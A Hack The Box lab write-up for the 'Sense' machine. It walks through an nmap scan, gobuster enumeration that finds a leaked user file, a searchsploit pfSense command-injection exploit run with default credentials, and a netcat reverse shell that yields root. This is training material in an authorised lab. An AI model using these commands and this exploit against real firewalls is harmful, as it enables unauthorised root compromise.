---
layout: single
title: Sense - Hack The Box
excerpt: This is the writeup for Sense, an absurdly easy machine with an authenticated RCE  
date: 2021-01-23
classes: wide
header:
  teaser: /assets/images/htb-writeup-beep/beep-logo.png
categories:
  - hackthebox
  - infosec
tags:
  - linux
  - dumb-machines
---

![](/assets/images/htb-writeup-sense/sense_logo.png)




<h2> Initial Foothold </h2>

We start the usual basics with an nmap scan

```bash
# Nmap 7.80 scan initiated Mon Jan 18 03:15:22 2021 as: nmap -sV -sC -Pn -oN nmap/init 10.10.10.60
Nmap scan report for 10.10.10.60
Host is up (0.10s latency).
Not shown: 998 filtered ports
PORT    STATE SERVICE    VERSION
80/tcp  open  http       lighttpd 1.4.35
|_http-server-header: lighttpd/1.4.35
|_http-title: Did not follow redirect to https://10.10.10.60/
|_https-redirect: ERROR: Script execution failed (use -d to debug)
443/tcp open  ssl/https?
|_ssl-date: TLS randomness does not represent time

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jan 18 03:17:19 2021 -- 1 IP address (1 host up) scanned in 116.57 seconds
```

we notice that 80 and 443 are open, however the 80 port only redirects any request to https

```bash
curl http://10.10.10.60/ --insecure --verbose
*   Trying 10.10.10.60:80...
* TCP_NODELAY set
* Connected to 10.10.10.60 (10.10.10.60) port 80 (#0)
> GET / HTTP/1.1
> Host: 10.10.10.60
> User-Agent: curl/7.68.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 301 Moved Permanently
< Location: https://10.10.10.60/
< Content-Length: 0
< Date: Mon, 18 Jan 2021 10:29:49 GMT
< Server: lighttpd/1.4.35
< 
* Connection #0 to host 10.10.10.60 left intact
                                                      
```

When we visit HTTPs https://10.10.10.60, we get a pfsense login page. We can look for the deafult logins on google and they are `"username":"pfsense"`, however they don't work

for now i'll run gobuster with `directory-list-lowercase-2.3-medium.txt` in the background and look around for more clues

```bash

gobuster dir -w /home/tyr4n7/Documents/seclist/SecLists-master/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt  -t 50  --url https://10.10.10.60/ -o enum/http_80 -k

```

I'll also check for common vulnerabilities using `searchexploit`:

```bash
searchsploit pfsense                                                                                                           130 ⨯
------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                         |  Path
------------------------------------------------------------------------------------------------------- ---------------------------------
pfSense - 'interfaces.php?if' Cross-Site Scripting                                                     | hardware/remote/35071.txt
pfSense - 'pkg.php?xml' Cross-Site Scripting                                                           | hardware/remote/35069.txt
pfSense - 'pkg_edit.php?id' Cross-Site Scripting                                                       | hardware/remote/35068.txt
pfSense - 'status_graph.php?if' Cross-Site Scripting                                                   | hardware/remote/35070.txt
pfSense - (Authenticated) Group Member Remote Command Execution (Metasploit)                           | unix/remote/43193.rb
pfSense 2 Beta 4 - 'graph.php' Multiple Cross-Site Scripting Vulnerabilities                           | php/remote/34985.txt
pfSense 2.0.1 - Cross-Site Scripting / Cross-Site Request Forgery / Remote Command Execution           | php/webapps/23901.txt
pfSense 2.1 build 20130911-1816 - Directory Traversal                                                  | php/webapps/31263.txt
pfSense 2.2 - Multiple Vulnerabilities                                                                 | php/webapps/36506.txt
pfSense 2.2.5 - Directory Traversal                                                                    | php/webapps/39038.txt
pfSense 2.3.1_1 - Command Execution                                                                    | php/webapps/43128.txt
pfSense 2.3.2 - Cross-Site Scripting / Cross-Site Request Forgery                                      | php/webapps/41501.txt
Pfsense 2.3.4 / 2.4.4-p3 - Remote Code Injection                                                       | php/webapps/47413.py
pfSense 2.4.1 - Cross-Site Request Forgery Error Page Clickjacking (Metasploit)                        | php/remote/43341.rb
pfSense 2.4.4-p1 (HAProxy Package 0.59_14) - Persistent Cross-Site Scripting                           | php/webapps/46538.txt
pfSense 2.4.4-p1 - Cross-Site Scripting                                                                | multiple/webapps/46316.txt
pfSense 2.4.4-p3 (ACME Package 0.59_14) - Persistent Cross-Site Scripting                              | php/webapps/46936.txt
pfSense 2.4.4-P3 - 'User Manager' Persistent Cross-Site Scripting                                      | freebsd/webapps/48300.txt
pfSense < 2.1.4 - 'status_rrd_graph_img.php' Command Injection                                         | php/webapps/43560.py
pfSense Community Edition 2.2.6 - Multiple Vulnerabilities                                             | php/webapps/39709.txt
pfSense Firewall 2.2.5 - Config File Cross-Site Request Forgery                                        | php/webapps/39306.html
pfSense Firewall 2.2.6 - Services Cross-Site Request Forgery                                           | php/webapps/39695.txt
pfSense UTM Platform 2.0.1 - Cross-Site Scripting                                                      | freebsd/webapps/24439.txt
------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
````

sadly we cannot get any clues about the version of pfsense using the common methods and thus we'll have to blindly run exploits and check if they work or not, however
most of them are not interesting except for the command injection 43560. It'd seem more plausible unlike other XSS exploits. Let's grab the exploit and run it 

```
searchsploit -m  php/webapps/43560.py
chmod +x 43560.py
./43560.py
/usr/bin/env: ‘python3\r’: No such file or directory
```
There are some carriage and trailing characters affecting it. we can delete the `\r` character by doing `tr -d '\r' < 43569.py > exploit.py`
running the exploit again, we clearly see that it requires authentication of an admin (username+password). Let's get back at our gobuster and see if it yielded anything, yet

```bash
gobuster dir -w /home/tyr4n7/Documents/seclist/SecLists-master/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt  -t 50  --url https://10.10.10.60/ -o enum/http_80 -k
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            https://10.10.10.60/
[+] Threads:        50
[+] Wordlist:       /home/tyr4n7/Documents/seclist/SecLists-master/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/01/18 04:34:49 Starting gobuster
===============================================================
/themes (Status: 301)
/css (Status: 301)
/includes (Status: 301)
/javascript (Status: 301)
/classes (Status: 301)
/widgets (Status: 301)
/tree (Status: 301)
/shortcuts (Status: 301)
/installer (Status: 301)
/wizards (Status: 301)
/csrf (Status: 301)
[ERROR] 2021/01/18 04:41:44 [!] Get https://10.10.10.60/60951: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
/filebrowser (Status: 301)
/%7echeckout%7e (Status: 403)
/system-users.txt (Status: 200)
===============================================================
2021/01/18 04:46:33 Finished
===============================================================
```
The system-users.txt looks interesting, let's check it out

```bash
curl https://10.10.10.60/system-users.txt
####Support ticket###

Please create the following user


username: Rohit
password: company defaults 
```
so it seems someone was gentle enough to leave us a password in the main directory. huh, that's honestly disappointing, could have been a little bit more interesting than that. Nonetheless we'll use it to run our exploit and get us a shell by running `nc -lnvp 2424` on shell-A and the exploit on shell-B

shell-B: 

```bash
./exploit.py --rhost 10.10.10.60 --lhost 10.10.14.4 --lport 2424 --username rohit --password pfsense       
CSRF token obtained
Running exploit...
Exploit completed
```

Shell-A:

```bash
nc -lnvp 2424         
listening on [any] 2424 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.60] 34389
sh: can't access tty; job control turned off
# id
uid=0(root) gid=0(wheel) groups=0(wheel)
```

Which got us the root shell, so there's no need to privesc. This was honestly the lamest box i've ever came across, it's basically the "Lame" box but with extra steps ¯\_(ツ)_/¯ 

Hope this helped,

-Tyr4n7


